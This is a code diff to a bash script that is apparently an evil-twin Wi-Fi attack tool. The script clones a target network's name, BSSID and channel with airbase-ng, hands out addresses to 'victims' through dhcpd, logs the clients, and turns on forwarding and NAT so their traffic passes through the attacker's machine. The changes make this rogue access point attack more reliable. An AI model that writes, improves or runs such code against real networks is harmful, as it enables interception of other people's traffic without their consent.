@@ -457,7 +457,7 @@ select_wifi() {
 #   None
 ###########################################
 select_internet_interface() {
-    local interfaces_number=`ifconfig 2>&1 | grep 'HWaddr' | wc -l`
+    local interfaces_number=$(ip -o link show 2>/dev/null | grep -v 'LOOPBACK' | grep 'UP' | wc -l)
 
     echo -ne '\033c'
     print_header
@@ -673,7 +673,20 @@ main() {
                     echo ""
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point...${WHITE}"
                     open_terminal "airbase-ng -e ${selected_essid} -a ${selected_bssid} -c ${selected_channel} ${wlan}" "Fake Access Point"
-                    sleep 3
+
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for at0 interface...${WHITE}"
+                    local at0_timeout=10
+                    while [ "$(ip -o link show at0 2>/dev/null)" = "" ] && [ "${at0_timeout}" -gt 0 ]; do
+                        sleep 1
+                        at0_timeout=$((at0_timeout - 1))
+                    done
+
+                    if [ "$(ip -o link show at0 2>/dev/null)" = "" ]; then
+                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} at0 interface not created. Check if airbase-ng is running.${WHITE}"
+                        sleep 2
+                        result='main'
+                        continue
+                    fi
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Configuring network for victims...${WHITE}"
                     create_dhcpd_config_file
@@ -684,15 +697,24 @@ main() {
 
                     iptables -P FORWARD ACCEPT
                     echo "1" > /proc/sys/net/ipv4/ip_forward
-                    iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
                     iptables -A INPUT -p icmp --icmp-type 8 -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
                     iptables -A INPUT -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -j DROP
+
+                    if [ -n "${lan}" ]; then
+                        iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
+                    else
+                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interface selected. Victims will have no internet access.${WHITE}"
+                    fi
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                     open_terminal "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "DHCP"
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
-                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
+                    if [ -n "${lan}" ]; then
+                        echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
+                    else
+                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
+                    fi
                     sleep 2
                     ;;
                 "2")
